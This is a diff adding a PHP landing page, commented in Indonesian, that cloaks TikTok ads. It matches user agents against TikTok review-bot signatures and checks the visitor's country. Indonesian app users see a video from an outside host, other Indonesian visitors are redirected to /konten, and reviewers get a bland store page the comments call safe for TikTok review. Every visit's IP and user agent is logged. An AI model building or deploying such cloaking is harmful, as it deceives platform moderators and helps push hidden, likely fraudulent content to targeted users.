@@ -1,0 +1,373 @@
+<?php
+// FUNGSI UTAMA: Deteksi TikTok/trill
+function is_tiktok_related() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    $tiktok_patterns = [
+        'TikTokAdsBot',
+        'TikTokContentReview',
+        'TikTokSafetyBot', 
+        'TikTokLPChecker',
+        'TikTokAdsMonitor',
+        'TikTokLiveReview',
+        'TikTokBot',
+        'Bytespider',
+        'trill',
+        'AppName/trill',
+        'ByteLocale',
+        'aweme',
+        'musically'
+    ];
+    
+    foreach ($tiktok_patterns as $pattern) {
+        if (stripos($ua, $pattern) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+// MAIN LOGIC
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
+$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+$is_tiktok = is_tiktok_related();
+$is_indonesia = ($country === 'ID');
+
+// SIMPAN LOG
+$log_data = "IP: " . $ip . "\n";
+$log_data .= "COUNTRY: " . $country . "\n";
+$log_data .= "USER AGENT (FULL):\n" . $user_agent . "\n";
+$log_data .= "DETECTED AS: " . ($is_tiktok ? 'TikTok/Trill Related' : 'Regular User') . "\n";
+
+// KONDISI 1: Trill + IP Indonesia → OVERLAY VIDEO
+if ($is_tiktok && $is_indonesia && stripos($user_agent, 'trill') !== false) {
+    $log_data .= "ACTION: Show Video Overlay (Trill Indonesia)\n\n";
+    file_put_contents('all_access.log', $log_data, FILE_APPEND);
+    
+    header('Content-Type: text/html; charset=utf-8');
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Official Store - Premium Products</title>
+    </head>
+    <body style="margin:0;background:#000;">
+        <video style="width:100%;height:100vh;object-fit:cover;" autoplay loop muted playsinline>
+            <source src="https://tiktok01.restomaknyus.online/img/tiktokshop12.mp4" type="video/mp4">
+        </video>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// KONDISI 2: Non-Trill + IP Indonesia → REDIRECT ke /konten
+if (!$is_tiktok && $is_indonesia) {
+    $log_data .= "ACTION: Redirect to /konten (Non-Trill Indonesia)\n\n";
+    file_put_contents('all_access.log', $log_data, FILE_APPEND);
+    
+    // Redirect ke /konten
+    header("Location: /konten");
+    exit;
+}
+
+// KONDISI 3: SEMUA LAINNYA → HTML AMAN UNTUK TIKTOK REVIEW
+$log_data .= "ACTION: Show Safe HTML Page\n\n";
+file_put_contents('all_access.log', $log_data, FILE_APPEND);
+
+// HEADER CONTENT TYPE
+header('Content-Type: text/html; charset=utf-8');
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official Store - Premium Quality Products</title>
+    <meta name="description" content="Discover amazing premium products with best quality and affordable prices. Fast shipping and secure payment.">
+    
+    <!-- OPEN GRAPH TAGS UNTUK TIKTOK ADS REVIEW -->
+    <meta property="og:title" content="Premium Products Collection">
+    <meta property="og:description" content="Best deals on quality products with guaranteed satisfaction">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?auto=format&fit=crop&w=1200&q=80">
+    <meta property="og:url" content="https://<?php echo $_SERVER['HTTP_HOST'] ?? 'example.com'; ?>">
+    <meta property="og:type" content="website">
+    
+    <!-- TWITTER CARD (Twitter juga punya TikTok) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Premium Products Store">
+    <meta name="twitter:description" content="Official store for premium quality products">
+    
+    <!-- FAVICON -->
+    <link rel="icon" type="image/x-icon" href="https://cdn-icons-png.flaticon.com/512/869/869869.png">
+    
+    <!-- STYLES -->
+    <style>
+        /* RESET */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        /* HEADER */
+        .header {
+            text-align: center;
+            margin-bottom: 50px;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .header p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        /* PRODUCTS SECTION */
+        .products {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            margin-bottom: 40px;
+        }
+        
+        .section-title {
+            font-size: 2rem;
+            color: #2d3748;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+        
+        .product-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #e9ecef;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .product-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            color: #4f46e5;
+        }
+        
+        .product-card h3 {
+            font-size: 1.3rem;
+            color: #2d3748;
+            margin-bottom: 15px;
+        }
+        
+        .product-card p {
+            color: #718096;
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+        }
+        
+        /* CALL TO ACTION */
+        .cta-section {
+            text-align: center;
+            background: white;
+            border-radius: 20px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+        }
+        
+        .cta-title {
+            font-size: 2.2rem;
+            color: #2d3748;
+            margin-bottom: 20px;
+        }
+        
+        .cta-description {
+            font-size: 1.1rem;
+            color: #718096;
+            max-width: 600px;
+            margin: 0 auto 40px;
+        }
+        
+        /* FEATURES */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 40px;
+        }
+        
+        .feature {
+            text-align: center;
+            color: white;
+            padding: 20px;
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            opacity: 0.9;
+        }
+        
+        .feature h4 {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            margin-top: 60px;
+            padding-top: 40px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            color: rgba(255,255,255,0.8);
+            font-size: 0.9rem;
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.2rem;
+            }
+            
+            .container {
+                padding: 20px 15px;
+            }
+            
+            .products, .cta-section {
+                padding: 30px 20px;
+            }
+            
+            .product-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>Premium Products Store</h1>
+            <p>Discover amazing quality products with the best prices. Fast shipping and secure payment guaranteed.</p>
+        </div>
+        
+        <!-- PRODUCTS -->
+        <div class="products">
+            <h2 class="section-title">Our Featured Products</h2>
+            <div class="product-grid">
+                <div class="product-card">
+                    <div class="product-icon">⭐</div>
+                    <h3>Premium Quality</h3>
+                    <p>All products are carefully selected and tested for superior quality and durability.</p>
+                </div>
+                
+                <div class="product-card">
+                    <div class="product-icon">🚚</div>
+                    <h3>Fast Delivery</h3>
+                    <p>Quick shipping with reliable partners to ensure timely delivery to your doorstep.</p>
+                </div>
+                
+                <div class="product-card">
+                    <div class="product-icon">💰</div>
+                    <h3>Best Prices</h3>
+                    <p>Competitive pricing with regular discounts and special offers for our customers.</p>
+                </div>
+                
+                <div class="product-card">
+                    <div class="product-icon">🛡️</div>
+                    <h3>Secure Shopping</h3>
+                    <p>100% secure payment processing with buyer protection and money-back guarantee.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- CALL TO ACTION -->
+        <div class="cta-section">
+            <h2 class="cta-title">Ready to Get Started?</h2>
+            <p class="cta-description">Join thousands of satisfied customers who trust us for their premium product needs.</p>
+        </div>
+        
+        <!-- FEATURES -->
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <h4>Quality Guaranteed</h4>
+                <p>30-day satisfaction guarantee</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">🔄</div>
+                <h4>Easy Returns</h4>
+                <p>Hassle-free return policy</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">📞</div>
+                <h4>24/7 Support</h4>
+                <p>Always here to help you</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <h4>Secure Payment</h4>
+                <p>SSL encrypted transactions</p>
+            </div>
+        </div>
+        
+        <!-- FOOTER -->
+        <div class="footer">
+            <p>&copy; 2024 Official Store. All rights reserved.</p>
+            <p style="margin-top: 10px; font-size: 0.8rem;">
+                Terms & Conditions | Privacy Policy | Contact Us
+            </p>
+        </div>
+    </div>
+    
+    <!-- SIMPLE SCRIPT (NO REDIRECT, NO POPUP) -->
+    <script>
+    console.log('Safe Landing Page loaded');
+    window.addEventListener('load', function() {
+        console.log('User Agent:', navigator.userAgent);
+    });
+    </script>
+</body>
+</html>
+<?php
+exit;
+?>
